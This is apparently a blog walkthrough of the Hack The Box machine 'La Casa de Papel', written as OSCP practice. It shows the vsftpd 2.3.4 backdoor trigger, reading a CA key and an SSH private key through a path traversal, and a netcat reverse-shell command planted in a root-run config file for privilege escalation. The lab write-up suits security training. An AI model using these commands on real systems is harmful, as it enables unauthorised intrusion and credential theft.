---
title:  "Hack The Box / La Casa de Papel"
date: 2020-02-13
tags: [Penetration Testing, Hacking, Hack The Box, Jeeves, OSCP, Offensive Security]
header: 
  image: "assets/images/casa/casa-header.png"
---
La Casa de Papel is our last machine in the OSCP list provided by [NetSec Focus](https://www.netsecfocus.com/)! Very interesting machine due to the enumeration and usage of different SSL certificates. Also, the foothold for the intrusion is very nice!. This is the last blog after my third attempt to the OSCP exam, I'm gonna publish my exam result email even if I failed it, and try to analize what I did and how I can improve it. The exam will be the end of this OSCP series, it will be published in the following 10 days. Let's get to La Casa de Papel!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/list.jpg" alt="nmap scan">

## Information Gathering


### Nmap Scan
So, we start with a nmap scan to check what ports are open and what services are running in this machine.
```
nmap -sC -sV -p- -oN scan.nmap 10.10.10.131
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/nmap.png" alt="nmap scan">
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/nmap.png" alt="nmap2 scan">

There are couple services running such as SSH, HTTP. Sounds like the enumeration is going to be quiet interesting this time due to the SSL enumeration. 

Visiting the website running in port 80, there is this website related to La Casa de Papel show on Netflix.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/browser.png" alt="nmap2 scan">

Curiously, there is this some kind of OTP token in order to get authenticated with it, but after searching around it was not very helpful. 

### Exploiting  vsftpd 2.3.4

 vsftpd 2.3.4 is a FTP server running in the target machine, this FTP server does not allow Anonymous login, but there are a couple of exploits that can be helpful. 
```
searchsploit vsftpd 2.3.4
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/searchsploit.png" alt="nmap2 scan">

According ```searchsploit``` metasploit has a module related to this FTP server and its vulnerability, but in the OSCP exam, the usage of metasploit has certain limitations, so in this case I found more information related to the server and its vulnerability in this [website](https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html). The website shows that the vulnerability can be exploited by adding a smile face ```:)``` at the end of the user. That will be a trigger for port 6200 to open and look for more posibilities. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/triger.png" alt="nmap2 scan">

Effectively, the vulnerability was tigger with the smile face, also we have a good answer in port 6200 which is some kind of php debugging shell called [Psy-shell](https://www.sitepoint.com/interactive-php-debugging-psysh/). There are some commands that are restricted in this kind of shell, commands such as, ```system```, but there are other commands that are allowed. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/help.png" alt="nmap2 scan">

According the commands that we can execute, the command ```ls``` allow us to see local variables, in this case on of the local variables are ```$tokyo```. Knowing this variable, we can see the content in this varible. To see the content, execute this command. 
```
show $tokyo
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/show.png" alt="nmap2 scan">

Something interesting here! There is this file with some kind of certificate located in ```/home/nairobi/ca.key```. We can read the file executing this commmand. 
```
readfile  ('/home/nairobi/ca.key')
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/read-key.png" alt="nmap2 scan">

This certificate can be helpful to generate a certificate signing a request using openssl. This certificate will be useful in order to get access to the target website. In order to do this, execute the following commands. 
```
openssl req -new -key ca.key -out server.csr
openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt
openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/sign-keys.png" alt="nmap2 scan">

Once having the certificate, there is a chance to import export this certificate to our firefox browser, you can follow instructions from this [website](https://knowledge.digicert.com/solution/SO5437.html) to import the certificate. 

Once the certificate is imported, we must remove the exemption in order to continue to the website.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/remove-exception.png" alt="nmap2 scan">

Once the exemption has been removed, and the certificate accepted, this is the content in the target website. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/cert-in.png" alt="nmap2 scan">

### Exploiting path traversal

Looking at the value of the episodes, this can be vulnerable to path traversal.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/path-trasversal.png" alt="nmap2 scan">

Looking at this, we might be able to see a couple of the users where one of them migh have the SSH key saved!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/which-user.png" alt="nmap2 scan">

Looking at couple of the episodes, they are encoded in base64, that means that we might get the SSH key with encoding the parameter in base64.
```
echo -n "../.ssh/id_rsa" | base64
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/which-user.png" alt="nmap2 scan">

Pasting the result in the parameter ```path=``` effectively we can download the SSH key. 

 

Once they is downloaded, it's time to give it permissions and login through SSH. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/getting.png" alt="nmap2 scan">

And we're in! Time top do privilege escalation. 0

## Privilege escalation

In the home directory of ```professor``` there is a file owned by root called ```mencached.ini``, this command is a writable command where we might be able to put our reverse shell. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/getting.png" alt="nmap2 scan">

So effectively we write the command with the following commnad. 
```
echo -ne "[program:memcached]\ncommand = nc 10.10.16.80 4444 -e /bin/bash" > memcached.ini
```
So this program is a service. Once we write it, we can wait and get a reverse shell back. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/got-root.png" alt="nmap2 scan">

And we are root!

## Reading user and root flag!

Now that we know the privilege escalation, we can read the root and the user flag.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/all-flags.png" alt="nmap2 scan">

The system has been owned

## Conclusion

It was interesting box due to the certificates that we have to import and part of the information gathering made with psy shell. It was a fun box due to the path traversal and privilege escalation! That was the end my friends. 